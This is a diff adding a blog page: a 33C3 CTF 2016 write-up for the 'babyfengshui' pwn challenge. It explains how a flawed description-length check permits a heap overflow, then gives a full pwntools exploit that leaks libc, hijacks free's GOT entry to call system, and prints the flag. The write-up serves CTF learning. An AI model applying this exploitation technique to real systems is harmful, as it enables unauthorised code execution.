@@ -1,0 +1,683 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>33C3 CTF 2016 – babyfengshui - Hacking Tube 2.0</title>
+<meta name="description" content="Category: pwnPoints: 150">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="33C3 CTF 2016 – babyfengshui">
+<meta property="og:url" content="http://0.0.0.0:4000/33c3-ctf-2016-babyfengshui/">
+
+
+  <meta property="og:description" content="Category: pwnPoints: 150">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2016-12-30T00:27:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/33c3-ctf-2016-babyfengshui/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="33C3 CTF 2016 – babyfengshui">
+    <meta itemprop="description" content="Category: pwnPoints: 150">
+    <meta itemprop="datePublished" content="December 30, 2016">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">33C3 CTF 2016 – babyfengshui
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> pwn
+<strong>Points:</strong> 150</p>
+
+<!-- more -->
+
+<p>32 bit ELF, with Partial RELRO, canary &amp; NX enabled, No PIE</p>
+
+<p>program menu:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./babyfengshui
+0: Add a user
+1: Delete a user
+2: Display a user
+3: Update a user description
+4: Exit
+</code></pre></div></div>
+<p>Add a user:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 0
+size of description: 50 &lt;-- max length of description
+name: AAAA 
+text length: 12 &lt;-- actual length of description
+text: 1234
+</code></pre></div></div>
+<p>Show a user:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 2
+index: 0 &lt;-- user's index
+name: AAAA
+description: 1234
+</code></pre></div></div>
+<p>Update a user:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Action: 3
+index: 0
+text length: 10 &lt;-- new length of the description
+text: 1234567890
+</code></pre></div></div>
+<p>Here’s the data structure of a user:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">user</span><span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">desc</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">124</span><span class="p">];</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>The program will free <code class="highlighter-rouge">user-&gt;desc</code> &amp; <code class="highlighter-rouge">user</code> while deleting a user. It also clear the pointer of the <code class="highlighter-rouge">user</code>, so there’s no Use-After-Free vulnerability.</p>
+
+<p>The program has some strange protection while setting the user’s description:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// users = struct user *users[]
+</span><span class="k">if</span> <span class="p">(</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">[</span><span class="n">text_len</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"my l33t defenses cannot be fooled, cya!"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"text: "</span><span class="p">);</span>
+<span class="n">read_n</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">desc</span><span class="p">,</span> <span class="n">text_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+<p>So <code class="highlighter-rouge">user-&gt;desc + text_len</code> must &lt; <code class="highlighter-rouge">user</code> (both <code class="highlighter-rouge">user-&gt;desc</code> and <code class="highlighter-rouge">user</code> are pointers). Guess it use this protection to avoid heap overflow.</p>
+
+<p>But what if we have the following heap memory layout?</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+            +-----------------------+
+userD-&gt;desc |                       |
+            |                       |
+            +-----------------------+
+            |            userB-&gt;desc| userB
+            |                       |
+            |                       |
+            |                       |
+            +-----------------------+
+            |            userC-&gt;desc| userC
+            |                       |
+            |                       |
+            |                       |
+            +-----------------------+
+            |            userD-&gt;desc| userD
+            |                       |
+            |                       |
+            |                       |
+            +-----------------------+
+</code></pre></div></div>
+<p>According to the protection, <code class="highlighter-rouge">userD-&gt;desc + text_len</code> should less than <code class="highlighter-rouge">userD</code>, <strong>which means it will be ok to overwrite the whole <code class="highlighter-rouge">userB</code> and <code class="highlighter-rouge">userC</code></strong>.</p>
+
+<p>It is possible to arrange the above heap memory layout if we’re familiar with malloc’s memory allocation. We can then exploit the heap overflow vulnerability and modify the <code class="highlighter-rouge">userB-&gt;desc</code> pointer, making us able to do the <strong>read/write anywhere</strong> attack. After that is pretty simple, we leak the libc’s base address and hijack <code class="highlighter-rouge">free</code>’s GOT to get the shell.</p>
+
+<p>```python exp_baby.py
+#!/usr/bin/env python</p>
+
+<p>from pwn import *
+import subprocess
+import sys
+import time</p>
+
+<p>HOST = “78.46.224.83”
+PORT = 1456
+ELF_PATH = “./babyfengshui_noalarm”
+LIBC_PATH = “./libc-2.19.so”</p>
+
+<h1 id="setting">setting</h1>
+<p>context.arch = ‘i386’
+context.os = ‘linux’
+context.endian = ‘little’
+context.word_size = 32</p>
+<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
+<p>context.log_level = ‘INFO’</p>
+
+<p>elf = ELF(ELF_PATH)
+libc = ELF(LIBC_PATH)</p>
+
+<p>def add_user(desc_len, name, text_len, text):
+    r.sendlineafter(“Action: “, “0”)
+    r.sendlineafter(“description: “, str(desc_len))
+    r.sendlineafter(“name: “, name)
+    r.sendlineafter(“length: “, str(text_len))
+    r.sendlineafter(“text: “, text)</p>
+
+<p>def del_user(index):
+    r.sendlineafter(“Action: “, “1”)
+    r.sendlineafter(“index: “, str(index))</p>
+
+<p>def show_user(index):
+    r.sendlineafter(“Action: “, “2”)
+    r.sendlineafter(“index: “, str(index))</p>
+
+<p>def update_user(index, text_len, text):
+    r.sendlineafter(“Action: “, “3”)
+    r.sendlineafter(“index: “, str(index))
+    r.sendlineafter(“length: “, str(text_len))
+    r.sendlineafter(“text: “, text)</p>
+
+<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+#r = process(ELF_PATH)
+
+add_user(50, "A"*123, 12, "a"*12)
+add_user(50, "B"*123, 12, "b"*12) 
+add_user(50, "C"*123, 12, "sh\x00") # user[2], desc = "sh\x00" (for later's GOT hijacking)
+del_user(0)
+add_user(90, "D"*123, 12, "d"*12)
+add_user(50, "E"*123, 0x100, "i"*0xf8 + p32(elf.got['__libc_start_main'])) 
+# now user[4]'s desc is user[0]'s desc (in previous)
+# user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt
+
+# leak address
+show_user(1)
+r.recvuntil("description: ")
+libc.address += u32(r.recv(4)) - libc.symbols['__libc_start_main']
+system_addr = libc.symbols['system']
+log.success("libc: "+hex(libc.address))
+log.success("system: "+hex(system_addr))
+
+# change user[1]-&gt;desc into free@got.plt
+# hijack free's got, then free user[2] to get shell
+update_user(4, 0x100, "i"*0xf8 + p32(elf.got['free']))
+update_user(1, 5, p32(system_addr))
+del_user(2)
+
+r.interactive() ```
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#33c3" class="page__taxonomy-item" rel="tag">33C3</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap" class="page__taxonomy-item" rel="tag">heap</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#heap-overflow" class="page__taxonomy-item" rel="tag">heap_overflow</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-12-30T00:27:00+08:00">December 30, 2016</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=33C3+CTF+2016+--+babyfengshui%20http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-babyfengshui%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-babyfengshui%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2F33c3-ctf-2016-babyfengshui%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/33c3-ctf-2016-espr/" class="pagination--pager" title="33C3 CTF 2016 – ESPR
+">Previous</a>
+    
+    
+      <a href="/33c3-ctf-2016-rec/" class="pagination--pager" title="33C3 CTF 2016 – rec
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/33c3-ctf-2016-babyfengshui/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/33c3-ctf-2016-babyfengshui"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
